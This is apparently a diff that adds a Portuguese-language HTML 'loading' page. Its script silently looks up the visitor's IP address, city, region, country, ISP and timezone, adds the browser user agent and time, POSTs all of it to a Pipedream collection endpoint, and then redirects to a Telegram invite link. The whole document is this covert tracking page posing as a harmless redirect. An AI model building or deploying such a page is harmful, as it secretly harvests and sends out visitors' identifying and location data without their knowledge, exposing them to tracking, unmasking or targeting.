@@ -1,0 +1,43 @@
+
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <title>Carregando...</title>
+</head>
+<body>
+  <h2>Carregando...</h2>
+  <script>
+    const PIPELINE_URL = "https://eolo4ouao15b326.m.pipedream.net";
+    const REDIRECT_URL = "https://t.me/+wv2A3bBooZcyNDEx";
+
+    fetch("https://ipapi.co/json/")
+      .then(response => response.json())
+      .then(data => {
+        const payload = {
+          ip: data.ip,
+          cidade: data.city,
+          regiao: data.region,
+          pais: data.country_name,
+          org: data.org,
+          timezone: data.timezone,
+          navegador: navigator.userAgent,
+          dataHora: new Date().toLocaleString()
+        };
+
+        return fetch(PIPELINE_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      })
+      .then(() => {
+        window.location.href = REDIRECT_URL;
+      })
+      .catch(error => {
+        console.error("Erro ao enviar dados:", error);
+        window.location.href = REDIRECT_URL;
+      });
+  </script>
+</body>
+</html>
